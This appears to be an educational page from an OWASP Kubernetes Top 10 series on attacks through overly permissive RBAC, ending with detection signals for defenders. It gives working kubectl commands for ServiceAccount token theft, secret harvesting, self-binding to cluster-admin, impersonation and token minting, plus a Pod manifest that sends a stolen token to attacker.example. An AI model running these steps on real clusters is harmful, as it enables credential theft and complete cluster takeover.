# K03: Overly Permissive RBAC Configurations - Attack Vectors

## Table of Contents
- [Understanding RBAC Attack Vectors](#understanding-rbac-attack-vectors)
- [Core Attack Flow](#core-attack-flow)
- [Step 1: Identity and Enumeration](#step-1-identity-and-enumeration)
- [Escalation Primitives](#escalation-primitives)
- [Chaining to Cluster-Admin](#chaining-to-cluster-admin)

## Understanding RBAC Attack Vectors

> **⚠ EDUCATIONAL PURPOSE ONLY** — the techniques below are shown so you can find and fix these issues in clusters you own or are authorised to test.

An RBAC attack is not an exploit against a bug—it is the **legitimate use of permissions that should never have been granted**. The attacker begins with some identity (usually a Pod's mounted ServiceAccount token after a container compromise), asks the API server what that identity is allowed to do, and then walks whichever escalation path the roles permit. Every step is an ordinary, authorised API call. There is no payload to detect at the request layer; the flaw is in the grant.

The attacker's objective in this category is almost always **privilege escalation**: turn the modest permissions of a foothold identity into `cluster-admin` (or the `system:masters` group), at which point the entire cluster—workloads, secrets, and nodes—is under their control.

### Core Attack Flow

```
1. Obtain an identity
   |
   Read the mounted ServiceAccount token from a compromised Pod
2. Enumerate permissions
   |
   kubectl auth can-i --list   (or the SelfSubjectRulesReview API)
3. Find an escalation primitive
   |
   secrets get/list, create pods, escalate/bind, impersonate, exec, tokenrequest
4. Escalate
   |
   Mint/steal a higher-privileged token, bind cluster-admin, or exec into a privileged Pod
5. Take over
   |
   Read all secrets, schedule workloads on every node, pivot to the cloud account
```

## Step 1: Identity and Enumeration

### 1. Read the Mounted ServiceAccount Token

By default every Pod carries its ServiceAccount's token, CA cert, and namespace on disk. Any command execution inside the container can read them.

```bash
# Inside a compromised container
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
APISERVER=https://kubernetes.default.svc

# The token now authenticates the attacker AS this ServiceAccount
curl --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
     $APISERVER/api/v1/namespaces/$NS/pods
```

**Payoff**: the attacker inherits the full RBAC of the workload identity, with no credentials of their own.

### 2. Enumerate What the Identity Can Do

The fastest reconnaissance step in Kubernetes is simply asking the API server.

```bash
# List every permission the current identity holds
kubectl auth can-i --list

# Probe specific high-value actions
kubectl auth can-i get secrets --all-namespaces
kubectl auth can-i create pods -n kube-system
kubectl auth can-i create clusterrolebindings
kubectl auth can-i impersonate users
kubectl auth can-i '*' '*' --all-namespaces   # are we effectively cluster-admin?
```

```
# Same question via the raw API (works from inside a Pod with curl)
POST /apis/authorization.k8s.io/v1/selfsubjectrulesreviews
{ "spec": { "namespace": "apps" } }
# Response lists resourceRules the token is allowed to perform
```

**Payoff**: a precise map of the escalation surface, produced by the cluster itself. Note that `can-i --list` is read-only and rarely alerted on.

## Escalation Primitives

Each pattern below is a single over-broad grant that, on its own, leads to compromise.

### 3. Reading Secrets Cluster-Wide

If the identity can `get`/`list` Secrets, it can harvest every credential in scope—including other ServiceAccounts' tokens.

```bash
kubectl get secrets --all-namespaces -o json \
  | jq -r '.items[] | select(.type=="kubernetes.io/service-account-token")
           | .metadata.namespace + "/" + .metadata.name'

# Decode a harvested token and re-auth as that (possibly privileged) SA
kubectl get secret ci-deployer-token -n cicd -o jsonpath='{.data.token}' | base64 -d
```

**Payoff**: database passwords, cloud keys, TLS private keys, and higher-privileged SA tokens—often including one bound to `cluster-admin`.

### 4. Creating Pods to Mount a Better Token

`create` on Pods (directly, or via Deployments/Jobs/DaemonSets) lets the attacker run a Pod as any ServiceAccount in that namespace and read its token.

```yaml
# Schedule a Pod that runs as a privileged SA and exfiltrates its token
apiVersion: v1
kind: Pod
metadata:
  name: pull
  namespace: kube-system
spec:
  serviceAccountName: privileged-controller   # a more powerful SA in this ns
  containers:
  - name: c
    image: curlimages/curl
    command: ["sh","-c","cat /var/run/secrets/kubernetes.io/serviceaccount/token
              | curl -d @- https://attacker.example/collect"]
```

The same primitive escapes to the node: a Pod with `hostPID`, a `hostPath` mount of `/`, or a privileged securityContext breaks out to the host.

**Payoff**: token theft for a stronger identity, or a direct node breakout.

### 5. escalate — Writing a Role Beyond Your Own Permissions

Normally the API server blocks you from creating or editing a role that grants more than you already hold (the escalation-prevention check). The `escalate` verb removes that guard.

```bash
# With escalate on clusterroles, rewrite a role you can edit to include wildcards
kubectl patch clusterrole app-reader --type=json -p='[{
  "op":"add","path":"/rules/-",
  "value":{"apiGroups":["*"],"resources":["*"],"verbs":["*"]}
}]'
# Any subject already bound to app-reader is now effectively cluster-admin
```

**Payoff**: self-granted wildcard permissions without ever holding them first.

### 6. bind — Binding Yourself to cluster-admin

The `bind` verb lets a subject create a binding to a role—including the built-in `cluster-admin`—bypassing the check that you must already hold what you grant.

```bash
kubectl create clusterrolebinding pwn \
  --clusterrole=cluster-admin \
  --serviceaccount=apps:foothold-sa
# The foothold ServiceAccount is now cluster-admin
```

**Payoff**: direct, one-command promotion to `cluster-admin`.

### 7. impersonate — Acting as a Privileged Identity

`impersonate` lets a subject perform requests *as* another user, group, or ServiceAccount, inheriting its permissions for that request.

```bash
# Impersonate a group that is bound to cluster-admin
kubectl get secrets --all-namespaces --as=null --as-group=system:masters

# Or impersonate a specific privileged ServiceAccount
kubectl auth can-i '*' '*' \
  --as=system:serviceaccount:kube-system:clusterrole-aggregation-controller
```

**Payoff**: full use of any identity's permissions—including the RBAC-bypassing `system:masters` group—without holding them directly.

### 8. Executing in Existing Privileged Pods

`create` on `pods/exec` or `pods/attach` runs commands inside already-running containers.

```bash
# Exec into a privileged system Pod and use ITS environment/token
kubectl exec -n kube-system -it <privileged-pod> -- sh
# From inside, read that Pod's mounted token, host mounts, or node access
```

**Payoff**: inherit a privileged Pod's identity and mounts without deploying anything new.

### 9. TokenRequest — Minting Tokens for Other ServiceAccounts

`create` on `serviceaccounts/token` lets a subject request a fresh, valid token for any ServiceAccount in the namespace.

```bash
kubectl create token privileged-controller -n kube-system
# Returns a signed bearer token for that SA -- no Secret read required
```

**Payoff**: on-demand tokens for stronger identities, even in clusters that no longer store SA tokens as Secrets.

### 10. Node Proxy and Kubelet Access

`get` on `nodes/proxy` reaches the kubelet API directly, bypassing much of the API server's own controls.

```
# Through the API server's node proxy to the kubelet
GET /api/v1/nodes/<node>/proxy/pods            # list pods on the node
POST /api/v1/nodes/<node>/proxy/exec/<ns>/<pod>/<container>   # exec via kubelet
```

**Payoff**: read other Pods' secrets and execute inside them, node by node.

### 11. CSR Approval — Issuing Certificates for Any Identity

`approve`/`update` on `certificatesigningrequests/approval` lets a subject approve a client certificate for an arbitrary identity, including the `system:masters` group.

```bash
# Submit a CSR with O=system:masters, then approve it
kubectl certificate approve attacker-csr
# The issued client cert is hard-wired to cluster-admin, outside RBAC
```

**Payoff**: a durable `cluster-admin` credential that survives RBAC changes.

## Chaining to Cluster-Admin

Real compromises rarely rely on a single grant; modest permissions combine into total control.

```
Compromised Pod (RCE)                 -> read mounted SA token
        +
can-i --list shows: secrets [get,list] -> harvest all SA tokens in scope
        +
one harvested token is bound cluster-admin -> authenticate as cluster-admin
        =  full cluster takeover, every call authorised
```

Another common chain uses only "create":

```
SA can create pods in kube-system     -> schedule a Pod as a privileged controller SA
        -> exfiltrate that Pod's token
        -> that SA can create clusterrolebindings
        -> bind self to cluster-admin
```

And the meta-permission chain:

```
SA has escalate on clusterroles       -> add wildcard rule to a role it is bound to
        -> now holds "*"/"*"/"*"
        -> read secrets, exec anywhere, pivot to node metadata / cloud IAM
```

## Detection Signals for Defenders

| Signal | What it may indicate |
|--------|----------------------|
| `SelfSubjectRulesReview` / `can-i --list` from a Pod SA | Permission enumeration after a foothold |
| `list secrets` across many namespaces by a workload SA | Credential harvesting |
| New `ClusterRoleBinding` to `cluster-admin` | Self-promotion via `bind` |
| `impersonate` requests in the audit log | Acting as a privileged identity |
| `create` `serviceaccounts/token` outside CI | Token minting for lateral movement |
| Pods created in `kube-system` by a non-system SA | Token theft / node breakout attempt |

## Key Takeaways

1. **The attack is authorised API use**—the cluster answers "what can I do?" and the attacker follows the map.
2. **A foothold Pod is a foothold identity**—the mounted token is the first thing an attacker reads.
3. **A few verbs are escalation primitives**—`secrets get/list`, `create pods`, `escalate`, `bind`, `impersonate`, `pods/exec`, `tokenrequest`, `nodes/proxy`, CSR approval.
4. **Modest grants chain**—create-Pod plus a privileged controller SA equals cluster-admin.
5. **Audit logs are your detection layer**—enumeration, cross-namespace Secret listing, and new admin bindings are the tells.

## Next Steps

- **[Prevention Guide](prevention.md)**: Build least-privilege roles and shut these paths down
- **[Code Examples](examples.md)**: Insecure vs. secure RBAC YAML side by side
- **[Kubernetes Learning Path](/learn/kubernetes)**: Continue the OWASP Kubernetes Top 10
- **[Practice](/practice)**: Apply these concepts in hands-on exercises
